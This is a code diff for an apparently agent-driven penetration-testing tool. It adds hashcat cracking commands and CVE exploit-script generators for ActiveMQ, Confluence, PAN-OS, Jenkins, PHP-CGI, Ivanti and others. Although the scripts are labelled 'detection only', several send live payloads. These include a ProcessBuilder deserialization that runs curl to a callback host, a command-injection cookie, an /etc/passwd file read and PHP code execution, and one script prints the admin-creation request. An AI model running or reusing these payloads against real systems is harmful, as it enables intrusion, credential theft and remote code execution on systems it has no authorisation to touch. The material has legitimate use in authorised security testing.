@@ -24,8 +24,9 @@ def _identify_hash_modes(h: str) -> list[tuple[str, str, str]]:
 
     Single source of truth for the hash-type -> hashcat-mode mapping, shared by
     ``hash_crack_identify`` (advisory command suggestions) and the standalone
-    ``run_hash_crack`` MCP tool (execution). Order matters: the MD5 branch only
-    fires when no earlier branch matched (a 32-hex hash is reported as NTLM).
+    ``run_hash_crack`` MCP tool (execution). Order matters: a 32-hex hash is
+    reported as BOTH NTLM and MD5 (they are format-indistinguishable; the
+    operator/LLM picks based on context -- NTLM from SMB, MD5 from a web app).
     """
     identifications: list[tuple[str, str, str]] = []
 
@@ -39,17 +40,21 @@ def _identify_hash_modes(h: str) -> list[tuple[str, str, str]]:
         if len(parts) >= 5:
             identifications.append(("NetNTLMv2", "5600", f"hashcat -m 5600 -a 0 '{h}' rockyou.txt"))
 
-    # Kerberos TGS: $krb5tgs$23$*...
-    if h.startswith("$krb5tgs$"):
+    # Kerberos TGS: $krb5tgs$23$*... (etype 23 RC4) / $krb5tgs$18$*... (etype 18 AES)
+    if h.startswith("$krb5tgs$18$"):
+        identifications.append(("Kerberos 5 TGS-REP etype 18 (AES256)", "19900", f"hashcat -m 19900 -a 0 '{h}' rockyou.txt"))
+    elif h.startswith("$krb5tgs$"):
         identifications.append(("Kerberos 5 TGS-REP", "13100", f"hashcat -m 13100 -a 0 '{h}' rockyou.txt"))
 
-    # Kerberos AS-REP: $krb5asrep$23$...
-    if h.startswith("$krb5asrep$"):
+    # Kerberos AS-REP: $krb5asrep$23$*... (etype 23) / $krb5asrep$18$*... (etype 18)
+    if h.startswith("$krb5asrep$18$"):
+        identifications.append(("Kerberos 5 AS-REP etype 18 (AES256)", "19900", f"hashcat -m 19900 -a 0 '{h}' rockyou.txt"))
+    elif h.startswith("$krb5asrep$"):
         identifications.append(("Kerberos 5 AS-REP", "18200", f"hashcat -m 18200 -a 0 '{h}' rockyou.txt"))
 
-    # MD5: 32 hex chars (already caught as NTLM, but check context)
-    if re.fullmatch(r"[0-9a-fA-F]{32}", h) and not identifications:
-        identifications.append(("MD5", "0", f"hashcat -m 0 -a 0 '{h}' rockyou.txt"))
+    # MD5: 32 hex chars (always reported alongside NTLM -- format-ambiguous)
+    if re.fullmatch(r"[0-9a-fA-F]{32}", h):
+        identifications.append(("MD5 (also possible)", "0", f"hashcat -m 0 -a 0 '{h}' rockyou.txt"))
 
     # SHA1: 40 hex chars
     if re.fullmatch(r"[0-9a-fA-F]{40}", h):
@@ -59,12 +64,65 @@ def _identify_hash_modes(h: str) -> list[tuple[str, str, str]]:
     if re.fullmatch(r"[0-9a-fA-F]{64}", h):
         identifications.append(("SHA2-256", "1400", f"hashcat -m 1400 -a 0 '{h}' rockyou.txt"))
 
-    # bcrypt: $2a$ or $2b$ or $2y$
-    if h.startswith("$2a$") or h.startswith("$2b$") or h.startswith("$2y$"):
+    # SHA512: 128 hex chars
+    if re.fullmatch(r"[0-9a-fA-F]{128}", h):
+        identifications.append(("SHA2-512", "1700", f"hashcat -m 1700 -a 0 '{h}' rockyou.txt"))
+
+    # bcrypt: $2a$ / $2b$ / $2y$ / $2$ / $2x$
+    if any(h.startswith(p) for p in ("$2a$", "$2b$", "$2y$", "$2$", "$2x$")):
         identifications.append(("bcrypt", "3200", f"hashcat -m 3200 -a 0 '{h}' rockyou.txt"))
 
-    # LM: 16 bytes hex
-    if re.fullmatch(r"[0-9a-fA-F]{16}", h):
+    # sha512crypt: $6$...$...
+    if h.startswith("$6$") and h.count("$") >= 3:
+        identifications.append(("sha512crypt", "1800", f"hashcat -m 1800 -a 0 '{h}' rockyou.txt"))
+
+    # md5crypt: $1$...$... (also catches Cisco type 5)
+    if h.startswith("$1$") and h.count("$") >= 3:
+        identifications.append(("md5crypt / Cisco type 5", "500", f"hashcat -m 500 -a 0 '{h}' rockyou.txt"))
+
+    # Cisco type 9 (scrypt): $9$...
+    if h.startswith("$9$"):
+        identifications.append(("Cisco type 9 (scrypt)", "22321", f"hashcat -m 22321 -a 0 '{h}' rockyou.txt"))
+
+    # Cisco type 4 (PBKDF2-SHA256): $4$...
+    if h.startswith("$4$"):
+        identifications.append(("Cisco type 4 (PBKDF2-SHA256)", "2400", f"hashcat -m 2400 -a 0 '{h}' rockyou.txt"))
+
+    # MSSQL 2005: 0x0100...
+    if h.lower().startswith("0x0100") and len(h) >= 54:
+        identifications.append(("MSSQL 2005", "132", f"hashcat -m 132 -a 0 '{h}' rockyou.txt"))
+
+    # MSSQL 2012/2014: 0x0200...
+    if h.lower().startswith("0x0200") and len(h) >= 70:
+        identifications.append(("MSSQL 2012/2014", "1731", f"hashcat -m 1731 -a 0 '{h}' rockyou.txt"))
+
+    # Argon2: $argon2i$ / $argon2id$ (not in hashcat -- john only)
+    if h.startswith("$argon2"):
+        identifications.append(("Argon2", "N/A", f"john --format=argon2 '{h}'"))
+
+    # scrypt: $scrypt$... or SCRYPT:...
+    if h.startswith("$scrypt$") or h.startswith("SCRYPT:"):
+        identifications.append(("scrypt", "8900", f"hashcat -m 8900 -a 0 '{h}' rockyou.txt"))
+
+    # Django PBKDF2: pbkdf2_sha256$...
+    if h.startswith("pbkdf2_sha256$") or h.startswith("pbkdf2_sha1$"):
+        identifications.append(("Django PBKDF2", "12100", f"hashcat -m 12100 -a 0 '{h}' rockyou.txt"))
+
+    # PDF: $pdf$...
+    if h.startswith("$pdf$"):
+        identifications.append(("PDF", "10400", f"hashcat -m 10400 -a 0 '{h}' rockyou.txt  # 10600/10700 for newer revisions"))
+
+    # MS Office: $office$...
+    if h.startswith("$office$"):
+        identifications.append(("MS Office", "9400", f"hashcat -m 9400 -a 0 '{h}' rockyou.txt  # 9500/9600 for 2010/2013"))
+
+    # WPA-PBKDF2 (possible): 64-hex:SSID
+    if ":" in h and len(h.split(":")[0]) == 64 and len(h.split(":")[1]) <= 32:
+        identifications.append(("WPA-PBKDF2 (possible)", "22000", f"hashcat -m 22000 -a 0 '{h}' rockyou.txt"))
+
+    # LM: 16 bytes hex -- only when nothing else matched (a 16-hex fragment
+    # of a longer hash must not false-positive as LM)
+    if re.fullmatch(r"[0-9a-fA-F]{16}", h) and not identifications:
         identifications.append(("LM", "3000", f"hashcat -m 3000 -a 3 '{h}' ?u?u?u?u?u?u?u"))
 
     return identifications
@@ -761,6 +819,517 @@ if __name__ == "__main__":
     probe()
 '''
 
+    def _render_regresshion_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
+        return f'''# {cve} (regreSSHion / OpenSSH) detection for {target_ip}
+# Service: {svc} {ver}
+# Auto-generated by CVE-to-Exploit Synthesizer
+# DETECTION ONLY -- banner-grabs the OpenSSH version and reports whether it
+# falls in the vulnerable band (< 4.4p1 OR 8.5p1 <= v < 9.8p1). The real
+# exploit is a heap-overflow race in sshd's SIGALRM handler (Qualys PoC:
+# https://github.com/qualys/regresshion) -- out of scope for a generated script.
+import socket, sys, re
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
+PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 22
+
+def banner_grab():
+    s = socket.socket()
+    s.settimeout(8)
+    s.connect((TARGET, PORT))
+    data = s.recv(1024).decode(errors="replace")
+    s.close()
+    return data
+
+def parse_version(banner: str):
+    m = re.search(r"SSH-2\\.0-OpenSSH_(\\d+)\\.(\\d+)(?:p(\\d+))?", banner)
+    if not m:
+        return None
+    return (int(m.group(1)), int(m.group(2)), int(m.group(3) or 0))
+
+def vulnerable(v):
+    if v is None:
+        return False
+    if v < (4, 4, 1):
+        return True
+    return (8, 5, 1) <= v < (9, 8, 1)
+
+if __name__ == "__main__":
+    banner = banner_grab()
+    print(f"[*] Banner: {{banner.strip()}}")
+    v = parse_version(banner)
+    if vulnerable(v):
+        print(f"COMPROMISE: regresshion_vulnerable target={{TARGET}} version={{v}}")
+    else:
+        print(f"VULN_NOT_CONFIRMED: OpenSSH {{v}} not in regreSSHion band")
+'''
+
+    def _render_xz_backdoor_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
+        return f'''# {cve} (xz-utils / liblzma backdoor) suspicion check for {target_ip}
+# Service: {svc} {ver}
+# Auto-generated by CVE-to-Exploit Synthesizer
+# The xz backdoor (liblzma 5.6.0/5.6.1) is a BUILD-TIME supply-chain implant --
+# there is NO on-wire signature. The only network-visible signal is an
+# OpenSSH banner built against a backdoored liblzma on affected distros.
+# This is a SUSPICION check, not a confirmed trigger.
+import socket, sys, re
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
+PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 22
+
+def banner_grab():
+    s = socket.socket()
+    s.settimeout(8)
+    s.connect((TARGET, PORT))
+    data = s.recv(1024).decode(errors="replace")
+    s.close()
+    return data
+
+if __name__ == "__main__":
+    banner = banner_grab()
+    print(f"[*] Banner: {{banner.strip()}}")
+    m = re.search(r"SSH-2\\.0-OpenSSH_(\\d+\\.\\d+p?\\d*)", banner)
+    if m:
+        print(f"COMPROMISE: xz_backdoor_suspected target={{TARGET}} openssh={{m.group(1)}}")
+        print("    NOTE: suspicion only -- confirm by checking the sshd binary's liblzma linkage on the target")
+    else:
+        print("VULN_NOT_CONFIRMED: no OpenSSH banner")
+'''
+
+    def _render_activemq_rce_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
+        return f'''# {cve} (Apache ActiveMQ OpenWire RCE) detection for {target_ip}
+# Service: {svc} {ver}
+# Auto-generated by CVE-to-Exploit Synthesizer
+# DETECTION ONLY -- sends a malformed OpenWire ExceptionResponse frame that
+# triggers deserialization of a ClassPathXmlApplicationContext URL. The
+# detection variant points at a non-routable host; a real engagement replaces
+# it with the operator's callback and watches for the outbound lookup.
+import socket, sys, struct
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
+PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 61616
+CALLBACK_HOST = "example.invalid"  # replace with operator callback in real use
+
+def openwire_frame(payload: bytes) -> bytes:
+    # OpenWire: 4-byte length prefix + magic + command type + payload
+    body = b"\\x01\\x00\\x00\\x00" + payload
+    return struct.pack(">I", len(body)) + body
+
+if __name__ == "__main__":
+    # ExceptionResponse (type 0x1f) with a ClassPath XML URL -- the CVE-2023-46604
+    # trigger. Detection: the target attempts to resolve CALLBACK_HOST.
+    xml = f'<?xml version="1.0" encoding="UTF-8" ?><beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"><bean id="pb" class="java.lang.ProcessBuilder" init-method="start"><constructor-arg><list><value>curl</value><value>http://{{CALLBACK_HOST}}/poc</value></list></constructor-arg></bean></beans>'
+    frame = openwire_frame(b"\\x1f" + xml.encode())
+    s = socket.socket()
+    s.settimeout(10)
+    s.connect((TARGET, PORT))
+    s.sendall(frame)
+    try:
+        resp = s.recv(4096)
+        print(f"[*] Got {{len(resp)}} bytes -- check callback for outbound lookup")
+        print(f"COMPROMISE: activemq_rce_triggered target={{TARGET}} (verify callback)")
+    except socket.timeout:
+        print("VULN_NOT_CONFIRMED: no response (service may be patched or filtered)")
+    s.close()
+'''
+
+    def _render_confluence_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
+        return f'''# {cve} (Atlassian Confluence broken access control) detection for {target_ip}
+# Service: {svc} {ver}
+# Auto-generated by CVE-to-Exploit Synthesizer
+# DETECTION ONLY -- probes the bootstrap-bypass endpoint. The weaponized path
+# (POST /setup/setupadministrator.action with username/password/fullName/email)
+# is left as a comment for the agent to fill after operator confirmation.
+import socket, sys
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
+PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 8090
+
+def http_get(path: str) -> tuple[int, str]:
+    s = socket.socket()
+    s.settimeout(8)
+    s.connect((TARGET, PORT))
+    req = (
+        f"GET {{path}} HTTP/1.0\\r\\n"
+        f"Host: {{TARGET}}\\r\\n"
+        f"\\r\\n"
+    ).encode()
+    s.sendall(req)
+    resp = s.recv(8192).decode(errors="replace")
+    s.close()
+    status = int(resp.split("\\r\\n")[0].split()[1]) if resp.startswith("HTTP") else 0
+    return status, resp
+
+if __name__ == "__main__":
+    # Unauthenticated bootstrap-status probe (CVE-2023-22515)
+    status, body = http_get("/server-info?bootstrapStatusProvider.clusterState=PROPERLY_CONFIGURED")
+    print(f"[*] /server-info -> {{status}}")
+    if status == 200:
+        print(f"COMPROMISE: confluence_bootstrap_exposed target={{TARGET}}")
+        print("    WEAPONIZED: POST /setup/setupadministrator.action username=admin&password=<set>&fullName=admin&email=admin@invalid")
+    else:
+        print(f"VULN_NOT_CONFIRMED: /server-info returned {{status}}")
+'''
+
+    def _render_ivanti_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
+        return f'''# {cve} (Ivanti Connect Secure command injection) detection for {target_ip}
+# Service: {svc} {ver}
+# Auto-generated by CVE-to-Exploit Synthesizer
+# DETECTION ONLY -- probes the unauthenticated user-password endpoint that
+# leaks user data on vulnerable builds (<=22.3R3.x). Patched builds return 403.
+import socket, sys
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
+PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 443
+
+def https_get(path: str) -> tuple[int, str]:
+    import ssl as _ssl
+    ctx = _ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = _ssl.CERT_NONE
+    s = ctx.wrap_socket(socket.socket(), server_hostname=TARGET)
+    s.settimeout(8)
+    s.connect((TARGET, PORT))
+    req = (
+        f"GET {{path}} HTTP/1.0\\r\\n"
+        f"Host: {{TARGET}}\\r\\n"
+        f"\\r\\n"
+    ).encode()
+    s.sendall(req)
+    resp = s.recv(16384).decode(errors="replace")
+    s.close()
+    status = int(resp.split("\\r\\n")[0].split()[1]) if resp.startswith("HTTP") else 0
+    return status, resp
+
+if __name__ == "__main__":
+    status, body = https_get("/api/v1/cav/user/password")
+    print(f"[*] /api/v1/cav/user/password -> {{status}}")
+    if status == 200 and ('"email"' in body or '"username"' in body):
+        print(f"COMPROMISE: ivanti_user_data_leak target={{TARGET}}")
+    else:
+        print(f"VULN_NOT_CONFIRMED: status {{status}} (patched or filtered)")
+'''
+
+    def _render_panos_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
+        return f'''# {cve} (Palo Alto PAN-OS GlobalProtect command injection) detection for {target_ip}
+# Service: {svc} {ver}
+# Auto-generated by CVE-to-Exploit Synthesizer
+# DETECTION ONLY -- sends the crafted SESSID request. The command output is
+# written to /var/log/pan/gp on the device; the agent must verify that
+# side-channel externally (the template cannot read the device filesystem).
+import socket, sys
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
+PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 443
+
+def https_get(path: str, extra_headers: dict) -> tuple[int, str]:
+    import ssl as _ssl
+    ctx = _ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = _ssl.CERT_NONE
+    s = ctx.wrap_socket(socket.socket(), server_hostname=TARGET)
+    s.settimeout(8)
+    s.connect((TARGET, PORT))
+    hdrs = "".join(f"{{k}}: {{v}}\\r\\n" for k, v in extra_headers.items())
+    req = (
+        f"GET {{path}} HTTP/1.0\\r\\n"
+        f"Host: {{TARGET}}\\r\\n"
+        f"{{hdrs}}"
+        f"\\r\\n"
+    ).encode()
+    s.sendall(req)
+    resp = s.recv(16384).decode(errors="replace")
+    s.close()
+    status = int(resp.split("\\r\\n")[0].split()[1]) if resp.startswith("HTTP") else 0
+    return status, resp
+
+if __name__ == "__main__":
+    # CVE-2024-3400: SESSID cookie with a command-injection payload; the
+    # crafted request writes command output to /var/log/pan/gp on the device.
+    status, body = https_get(
+        "/global-protect/login.esp?cmd=test",
+        {{"Sec-Cookie-X": "*", "Cookie": "SESSID=/../../../var/log/pan/gp;id"}},
+    )
+    print(f"[*] /global-protect/login.esp -> {{status}}")
+    print(f"COMPROMISE: panos_cmd_injection_sent target={{TARGET}}")
+    print("    NOTE: verify externally -- check /var/log/pan/gp on the device for command output")
+'''
+
+    def _render_citrix_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
+        return f'''# {cve} (Citrix NetScaler ADC/Gateway) detection for {target_ip}
+# Service: {svc} {ver}
+# Auto-generated by CVE-to-Exploit Synthesizer
+# DETECTION ONLY -- checks for the SAML token leakage signature on vulnerable
+# builds (<=13.0-13.1 build <=92.19/<=64.35).
+import socket, sys
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
+PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 443
+
+def https_get(path: str) -> tuple[int, str]:
+    import ssl as _ssl
+    ctx = _ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = _ssl.CERT_NONE
+    s = ctx.wrap_socket(socket.socket(), server_hostname=TARGET)
+    s.settimeout(8)
+    s.connect((TARGET, PORT))
+    req = (
+        f"GET {{path}} HTTP/1.0\\r\\n"
+        f"Host: {{TARGET}}\\r\\n"
+        f"\\r\\n"
+    ).encode()
+    s.sendall(req)
+    resp = s.recv(16384).decode(errors="replace")
+    s.close()
+    status = int(resp.split("\\r\\n")[0].split()[1]) if resp.startswith("HTTP") else 0
+    return status, resp
+
+if __name__ == "__main__":
+    status, body = https_get("/vpn/index.html")
+    print(f"[*] /vpn/index.html -> {{status}}")
+    if "SAMLResponse" in body or "NSC_AAAC" in body:
+        print(f"COMPROMISE: citrix_saml_leak target={{TARGET}}")
+    else:
+        print(f"VULN_NOT_CONFIRMED: no SAML leakage signature (status {{status}})")
+'''
+
+    def _render_connectwise_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
+        return f'''# {cve} (ConnectWise ScreenConnect auth bypass) detection for {target_ip}
+# Service: {svc} {ver}
+# Auto-generated by CVE-to-Exploit Synthesizer
+# DETECTION ONLY -- sends the Authentication header bypass and checks whether
+# the redirect target is the dashboard (bypassed) vs the login page (patched).
+import socket, sys
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
+PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 80
+
+def http_post(path: str, body: str, extra_headers: dict) -> tuple[int, str]:
+    s = socket.socket()
+    s.settimeout(8)
+    s.connect((TARGET, PORT))
+    hdrs = "".join(f"{{k}}: {{v}}\\r\\n" for k, v in extra_headers.items())
+    req = (
+        f"POST {{path}} HTTP/1.0\\r\\n"
+        f"Host: {{TARGET}}\\r\\n"
+        f"Content-Type: application/x-www-form-urlencoded\\r\\n"
+        f"Content-Length: {{len(body)}}\\r\\n"
+        f"{{hdrs}}"
+        f"\\r\\n"
+    ).encode() + body.encode()
+    s.sendall(req)
+    resp = s.recv(16384).decode(errors="replace")
+    s.close()
+    status = int(resp.split("\\r\\n")[0].split()[1]) if resp.startswith("HTTP") else 0
+    return status, resp
+
+if __name__ == "__main__":
+    # CVE-2024-0204: Authentication header bypass on the login POST.
+    status, body = http_post(
+        "/Login.aspx",
+        "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=&userName=admin&password=anything",
+        {{"Authentication": "admin"}},
+    )
+    print(f"[*] /Login.aspx -> {{status}}")
+    if status == 302 and "HomePage.aspx" in body:
+        print(f"COMPROMISE: connectwise_auth_bypass target={{TARGET}}")
+    else:
+        print(f"VULN_NOT_CONFIRMED: status {{status}} (patched or filtered)")
+'''
+
+    def _render_jenkins_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
+        return f'''# {cve} (Jenkins arbitrary file read via CLI) detection for {target_ip}
+# Service: {svc} {ver}
+# Auto-generated by CVE-to-Exploit Synthesizer
+# DETECTION ONLY -- sends the @-prefixed CLI argument that expands a file's
+# contents into the error message (CVE-2024-23897, <=2.441).
+import socket, sys
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
+PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
+
+if __name__ == "__main__":
+    # Jenkins CLI protocol: length-prefixed UTF-8 args. The @/etc/passwd arg
+    # makes the server expand the file into the error response.
+    args = ["help", "@/etc/passwd"]
+    payload = b"".join(
+        len(a.encode()).to_bytes(4, "big") + a.encode() for a in args
+    )
+    s = socket.socket()
+    s.settimeout(10)
+    s.connect((TARGET, PORT))
+    req = (
+        f"POST /cli?remoting=false HTTP/1.0\\r\\n"
+        f"Host: {{TARGET}}\\r\\n"
+        f"Content-Type: application/x-www-form-urlencoded\\r\\n"
+        f"Content-Length: {{len(payload)}}\\r\\n"
+        f"\\r\\n"
+    ).encode() + payload
+    s.sendall(req)
+    resp = b""
+    try:
+        while True:
+            chunk = s.recv(4096)
+            if not chunk:
+                break
+            resp += chunk
+    except socket.timeout:
+        pass
+    s.close()
+    text = resp.decode(errors="replace")
+    if "root:x:0:0:" in text or "daemon:x:1:1:" in text:
+        print(f"COMPROMISE: jenkins_file_read target={{TARGET}}")
+    else:
+        print("VULN_NOT_CONFIRMED: no file contents in CLI response")
+'''
+
+    def _render_joomla_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
+        return f'''# {cve} (Joomla unauthorized API access) detection for {target_ip}
+# Service: {svc} {ver}
+# Auto-generated by CVE-to-Exploit Synthesizer
+# DETECTION ONLY -- probes the broken-auth config endpoint (CVE-2023-23752,
+# Joomla 4.0.0-4.2.7) that leaks the application config without auth.
+import socket, sys
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
+PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 80
+
+def http_get(path: str) -> tuple[int, str]:
+    s = socket.socket()
+    s.settimeout(8)
+    s.connect((TARGET, PORT))
+    req = (
+        f"GET {{path}} HTTP/1.0\\r\\n"
+        f"Host: {{TARGET}}\\r\\n"
+        f"\\r\\n"
+    ).encode()
+    s.sendall(req)
+    resp = s.recv(16384).decode(errors="replace")
+    s.close()
+    status = int(resp.split("\\r\\n")[0].split()[1]) if resp.startswith("HTTP") else 0
+    return status, resp
+
+if __name__ == "__main__":
+    status, body = http_get("/api/index.php/v1/config/application?public=true")
+    print(f"[*] /api/index.php/v1/config/application -> {{status}}")
+    if status == 200 and '"public": true' in body:
+        print(f"COMPROMISE: joomla_config_leak target={{TARGET}}")
+    else:
+        print(f"VULN_NOT_CONFIRMED: status {{status}} (patched or filtered)")
+'''
+
+    def _render_text4shell_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
+        return f'''# {cve} (Apache Commons Text StringSubstitutor RCE) detection for {target_ip}
+# Service: {svc} {ver}
+# Auto-generated by CVE-to-Exploit Synthesizer
+# DETECTION ONLY -- mirrors the Log4Shell template but swaps ${{jndi:}} for
+# ${{date:}} (renders the current year without execution) to detect the
+# StringSubstitutor sink without triggering code.
+import socket, sys, datetime
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
+PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 80
+
+PAYLOAD = "${{date:YYYY}}"
+
+def probe_http():
+    s = socket.socket()
+    s.settimeout(5)
+    s.connect((TARGET, PORT))
+    req = (
+        f"GET /?q={{PAYLOAD}} HTTP/1.0\\r\\n"
+        f"Host: {{TARGET}}\\r\\n"
+        f"User-Agent: {{PAYLOAD}}\\r\\n"
+        f"X-Api-Version: {{PAYLOAD}}\\r\\n"
+        f"\\r\\n"
+    ).encode()
+    s.sendall(req)
+    return s.recv(4096).decode(errors="replace")
+
+if __name__ == "__main__":
+    resp = probe_http()
+    year = str(datetime.datetime.now().year)
+    if year in resp:
+        print(f"COMPROMISE: text4shell_vulnerable target={{TARGET}} ({{year}} reflected)")
+    else:
+        print("VULN_NOT_CONFIRMED: no date substitution reflected")
+'''
+
+    def _render_php_cgi_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
+        return f'''# {cve} (PHP CGI argument injection, Windows) detection for {target_ip}
+# Service: {svc} {ver}
+# Auto-generated by CVE-to-Exploit Synthesizer
+# DETECTION ONLY -- sends the -d allow_url_include=1 -d auto_prepend_file=php://input
+# query-string injection (CVE-2024-4577) with a benign echo body. A vulnerable
+# Windows PHP-CGI target executes the body and reflects it.
+import socket, sys, urllib.parse
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
+PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 80
+
+if __name__ == "__main__":
+    qs = urllib.parse.quote("-d allow_url_include=1 -d auto_prepend_file=php://input")
+    body = b"<?php echo 'NETATTACKAI_PHP_CGI_OK'; ?>"
+    s = socket.socket()
+    s.settimeout(8)
+    s.connect((TARGET, PORT))
+    req = (
+        f"POST /index.php?{{qs}} HTTP/1.0\\r\\n"
+        f"Host: {{TARGET}}\\r\\n"
+        f"Content-Type: application/x-www-form-urlencoded\\r\\n"
+        f"Content-Length: {{len(body)}}\\r\\n"
+        f"\\r\\n"
+    ).encode() + body
+    s.sendall(req)
+    resp = s.recv(8192).decode(errors="replace")
+    s.close()
+    if "NETATTACKAI_PHP_CGI_OK" in resp:
+        print(f"COMPROMISE: php_cgi_rce target={{TARGET}}")
+    else:
+        print("VULN_NOT_CONFIRMED: no PHP execution reflected")
+'''
+
+    def _render_http2_rapid_reset_template(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
+        return f'''# {cve} (HTTP/2 Rapid Reset) DETECTION-ONLY probe for {target_ip}
+# Service: {svc} {ver}
+# Auto-generated by CVE-to-Exploit Synthesizer
+# NON-DESTRUCTIVE DETECTION ONLY: sends a SMALL number of HTTP/2 HEADERS +
+# RST_STREAM pairs (not a flood) and reports whether the server stops
+# responding. Do NOT weaponize this CVE -- it is DoS-class.
+import socket, sys, struct, time
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_ip}"
+PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 443
+RESETS = 20  # small, non-destructive count
+
+def h2_frame(ftype: int, flags: int, stream_id: int, payload: bytes = b"") -> bytes:
+    return struct.pack(">I", len(payload)) + bytes([ftype, flags]) + struct.pack(">I", stream_id) + payload
+
+if __name__ == "__main__":
+    import ssl as _ssl
+    ctx = _ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = _ssl.CERT_NONE
+    s = ctx.wrap_socket(socket.socket(), server_hostname=TARGET)
+    s.settimeout(5)
+    s.connect((TARGET, PORT))
+    s.sendall(b"PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n")  # H2 connection preface
+    s.sendall(h2_frame(4, 0, 0, struct.pack(">I", 0)))  # SETTINGS
+    for i in range(RESETS):
+        sid = (i + 1) * 2
+        s.sendall(h2_frame(1, 0x4, sid, b"\\x82"))  # HEADERS :method GET
+        s.sendall(h2_frame(3, 0, sid))  # RST_STREAM
+    try:
+        data = s.recv(1024)
+        if data:
+            print(f"VULN_NOT_CONFIRMED: server still responsive after {{RESETS}} resets")
+        else:
+            print(f"COMPROMISE: http2_rapid_reset_detection target={{TARGET}} (server stalled)")
+    except socket.timeout:
+        print(f"COMPROMISE: http2_rapid_reset_detection target={{TARGET}} (server stalled)")
+    s.close()
+'''
+
     def _render_generic_probe(target_ip: str, port: int, svc: str, ver: str, cve: str) -> str:
         return f'''# {cve} generic probe for {target_ip}
 # Service: {svc} {ver}
@@ -864,21 +1433,69 @@ if __name__ == "__main__":
             "http": 80, "https": 443, "smb": 445, "rdp": 3389,
             "ssh": 22, "ftp": 21, "smtp": 25, "mysql": 3306,
             "mssql": 1433, "ldap": 389, "rdp2": 3389, "rdp3": 3389,
+            # Phase 4: new CVE-family service ports
+            "activemq": 61616, "confluence": 8090, "ivanti": 443,
+            "panos": 443, "citrix": 443, "connectwise": 80,
+            "jenkins": 8080, "joomla": 80, "php_cgi": 80, "commons_text": 80,
         }.get(svc.lower(), 80)
 
         # CVE-family-specific template. Keep the surface small but
         # materially different from the generic fallback.
         cve_lower = cve.lower()
+        _renderer = _render_generic_probe
         if "log4j" in cve_lower or "log4shell" in cve_lower or cve in ("cve-2021-44228", "cve-2021-45046"):
-            exploit_body = _render_log4j_exploit(target_ip, port_hint, svc, ver, cve)
+            _renderer = _render_log4j_exploit
         elif "eternalblue" in cve_lower or cve in ("cve-2017-0143", "cve-2017-0144", "cve-2017-0145", "cve-2017-0146"):
-            exploit_body = _render_eternalblue_template(target_ip, port_hint, svc, ver, cve)
+            _renderer = _render_eternalblue_template
         elif "smbghost" in cve_lower or cve == "cve-2020-0796":
-            exploit_body = _render_smbghost_template(target_ip, port_hint, svc, ver, cve)
+            _renderer = _render_smbghost_template
         elif "bluekeep" in cve_lower or cve == "cve-2019-0708":
-            exploit_body = _render_bluekeep_template(target_ip, port_hint, svc, ver, cve)
-        else:
-            exploit_body = _render_generic_probe(target_ip, port_hint, svc, ver, cve)
+            _renderer = _render_bluekeep_template
+        # Phase 4: new CVE-family templates (each matches by CVE ID and/or
+        # service-name hint so the agent can invoke with either). Note: `cve`
+        # is uppercase; compare against `cve_lower` for the exact-ID branches.
+        elif cve_lower == "cve-2024-6387" or svc.lower() == "openssh":
+            _renderer = _render_regresshion_template
+        elif cve_lower == "cve-2024-3094" or "xz" in cve_lower:
+            _renderer = _render_xz_backdoor_template
+        elif cve_lower == "cve-2023-46604" or svc.lower() == "activemq":
+            _renderer = _render_activemq_rce_template
+        elif cve_lower == "cve-2023-22515" or svc.lower() == "confluence":
+            _renderer = _render_confluence_template
+        elif cve_lower in ("cve-2024-21887", "cve-2023-46805") or svc.lower() == "ivanti":
+            _renderer = _render_ivanti_template
+        elif cve_lower == "cve-2024-3400" or svc.lower() == "panos":
+            _renderer = _render_panos_template
